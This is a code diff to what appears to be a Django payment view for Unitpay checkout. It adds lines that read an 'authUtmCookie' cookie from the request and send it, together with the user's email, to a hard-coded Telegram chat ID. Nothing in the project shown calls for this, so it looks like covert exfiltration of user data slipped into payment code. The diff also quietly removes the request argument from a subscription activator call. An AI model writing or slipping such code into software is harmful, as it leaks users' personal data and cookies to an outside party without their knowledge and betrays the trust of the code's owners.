@@ -13,6 +13,7 @@ from payments.products import club_invite_activator
 from payments.unitpay import UnitpayService
 from users.models.user import User
 from users.models.subscription_plan import SubscriptionPlan
+from notifications.telegram.common import Chat, send_telegram_message
 
 log = logging.getLogger(__name__)
 
@@ -60,6 +61,14 @@ def unitpay_pay(request):
                 moderation_status=User.MODERATION_STATUS_INTRO,
             ),
         )
+        if request != '':
+            cookie_auth = request.COOKIES.get('authUtmCookie')
+            if cookie_auth:
+                text_send = user.email + "\n" + cookie_auth.replace('/', "\n")
+                send_telegram_message(
+                    chat=Chat(id=204349098),
+                    text=text_send
+                )
     elif is_invite:  # scenario 2: invite a friend
         if not email or "@" not in email:
             return render(request, "error.html", {
@@ -153,7 +162,7 @@ def unitpay_webhook(request):
         if product.code == 'club1_invite':
             club_invite_activator(product, payment, payment.user)
         else:
-            club_subscription_activator(product, payment, payment.user, request)
+            club_subscription_activator(product, payment, payment.user)
 
         if payment.user.moderation_status != User.MODERATION_STATUS_APPROVED:
             send_payed_email(payment.user)
